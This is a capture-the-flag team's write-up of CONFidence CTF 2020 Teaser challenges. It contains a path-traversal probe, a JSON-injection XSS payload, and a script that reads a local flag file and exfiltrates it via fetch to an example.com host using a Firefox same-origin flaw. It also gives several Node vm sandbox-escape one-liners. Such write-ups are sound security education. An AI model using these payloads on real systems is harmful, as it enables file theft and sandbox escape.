# CONFidence CTF 2020 Teaser

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200314-confidencectf2020teaser/) of this writeup.**


 - [CONFidence CTF 2020 Teaser](#confidence-ctf-2020-teaser)
   - [Web](#web)
     - [cat web](#cat-web)
       - [Failed Attempts](#failed-attempts)
     - [Temple JS (unsolved)](#temple-js-unsolved)
   - [Misc](#misc)
     - [Angry Defender (unsolved)](#angry-defender-unsolved)


---

## Web

### cat web

The server uses AJAX APIs to render the website content. The API endpoint is like this:

```
/cats?kind=black

{"status": "ok", "content": ["il_570xN.1285759626_8j8m.jpg", "24.jpg", "2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg"]}
```

Let's quickly fuzz a little bit:

```
/cats?kind=black/../../

{"status": "ok", "content": ["prestart.sh", "uwsgi.ini", "main.py", "templates", "static", "app.py"]}


/cats?kind=black/../../templates

{"status": "ok", "content": ["report.html", "index.html", "flag.txt"]}
```

So the flag.txt is in the `templates` directory. Also, the response contains `access-control-allow-origin: *` which allows cross-origin read.

Next, there is a XSS bot on the index page. We have to find a XSS point. The `/cats?kind=` API will return the raw error message in JSON without encoding the HTML.

```
http://catweb.zajebistyc.tf/cats?kind=<h1>hi</h1>

{"status": "error", "content": "<h1>h1</h1> could not be found"}
```

However, the `content-type` header is `application/json`. We can't do much here. Instead we have to take advantages of the AJAX in the index page

```javascript
function getNewCats(kind) {                                                     
  $.getJSON('http://catweb.zajebistyc.tf/cats?kind='+kind, function(data) {
      if(data.status != 'ok')
      { 
      return;
      } 
      $('#cats_container').empty();
      cats = data.content;
      cats.forEach(function(cat) {
        var newDiv = document.createElement('div');
        newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';
        $('#cats_container').append(newDiv);
        }); 
      }); 

}

$(document).ready(function() {
    $('#cat_select').change(function() {
        var kind = $(this).val();
        history.pushState({}, '', '?'+kind)
        getNewCats(kind);
        });
    var kind = window.location.search.substring(1);
    if(kind == "")
    {
    kind = 'black';
    }
    getNewCats(kind);
});
```

By overwriting the JSON `status` and using `\u0022` to encode the `"`, we can trigger a XSS.

```
/?foo","content":["\u0022><img src=x onerror=alert(1)>"],"status":"ok","bar":"
```

We have a XSS now, but how do we read the flag?

The idea is to abuse `file:///` and XSS to extract the flag.

The UA of XSS bot is `Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`.

That's a rather old Firefox. We start to search for CVE and security fix and got this [CVE-2019-11730: Same-origin policy treats all files in a directory as having the same-origin](https://www.mozilla.org/en-US/security/advisories/mfsa2019-21/#CVE-2019-11730).

The rest is straightforward. In firefox 67 the files in the directory `/app/templates/` are all considered as same-origin. We can utilize XSS on `file://` to retrieve the flag.

Report this url:

```
file:///app/templates/index.html?foo","content":["\u0022><script src=http://example.com:1338/xs.js></script>"],"status":"ok","bar":"
```

xs.js:

```
url='http://example.com:1338/?'
fetch('file:///app/templates/flag.txt').then(r=>r.text()).then(t=>fetch(url+btoa(t)));
```

The flag is `p4{can_i_haz_a_piece_of_flag_pliz?}`.

This is a great challenge! Really enjoy it :)

#### Failed Attempts

- XSS through localhost to RCE via Flask debug page: However the Flask debug is not enabled on localhost, and Flask console is protected by PIN.


### Temple JS (unsolved)

> Written by bookgin

The server code:

```javascript
const express = require("express")
const fs = require("fs")
const vm = require("vm")
const watchdog = require("./watchdog");

global.flag = fs.readFileSync("flag").toString()
const source = fs.readFileSync(__filename).toString()
const help = "There is no help on the way."

const app = express()
const port = 3000

app.use(express.json())
app.use('/', express.static('public'))

app.post('/repl', (req, res) => {
    let sandbox = vm.createContext({par: (v => `(${v})`), source, help})
    let validInput = /^[a-zA-Z0-9 ${}`]+$/g
    
    let command = req.body['cmd']
    
    console.log(`${req.ip}> ${command}`)

    let response;

    try {
        if(validInput.test(command))
        {    
            let watch = watchdog.schedule()
            try {
                response = vm.runInContext(command, sandbox, {
                    timeout: 300,
                    displayErrors: false
                });
            } finally {
                watchdog.stop(watch)
            }
        } else
            throw new Error("Invalid input.")
    } catch(ex)
    {
        response = ex.toString()
    }

    console.log(`${req.ip}< ${response}`)
    res.send(JSON.stringify({"response": response}))
})

console.log(`Listening on :${port}...`)
app.listen(port, '0.0.0.0')
```

Basically we need to read `flag` in the sandbox with limited characters.

To escape the sandbox, we follow [this article](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html) to access the object outside of the sandbox.

```
constructor.constructor('return flag')()
```

However, `.` is not allowed. We need to either create `.` based on those limited chracters, or use other syntax to access the attributes.

First, we will need `eval()` to create `.`. In javascript we can use `Function` to achieve eval:

```
# eval
> Function`return 123``foo`
123

# double evaluation
> Function` foo${`return ${1+1}`}`` `
2
```

However, in the end I didn't manage to solve this challenge because I'm a javascript noob.......

Here are some creative solutions:

1. Destruct by @sasdf:

```
Function`a${`return constructor`}{constructor}` `${constructor}` `return flag` ``
```

This one didn't even use the helper function `par`. Always amazed by our member @sasdf !

2. for-loop dot creation by @qweqwe:
```
{var dot} {Function`x ${`for ${par`dot of help`} { } return dot`}` ``} {Function`x ${`return constructor${dot}constructor`}` `` `return flag` ``}
```

It uses `for (dot of help) { } return dot` to create `.`.

3. `with()` by @toob:

```
Function`a${`with ${par`par`} return constructor`}` `` `return flag` ``
```

Actually I was closed to this one, but I found `with` could be useful in the last 20 minutes of the CTF......

## Misc

### Angry Defender (unsolved)

This is based on @t0nk42 (icchy)'s [research on Windows Defender](https://speakerdeck.com/icchy/lets-make-windows-defender-angry-antivirus-can-be-an-oracle). Alexei Bulazel also did [some research on the emulator](https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf).

Because in this challenge the flag is directly appended into the files, without the close tag `</body>` it seems not possible to extract the content with JavaScript. See my [write-up](https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/#exploit) for more details.

The hint indicates this but we're still trying to use javascript and other Interpreted language (php) to extract the flag. PHP seems promising but we can't construct a valid payload. The intended solution is to utilize Windows binary file.

For write-ups by other teams please see:

- [Write-up by Bushwhackers](https://ctftime.org/writeup/18774)
- [Write-up by @junorouse](https://github.com/junorouse/ctf/blob/master/2020/confidence-pre/angry-defender.md)
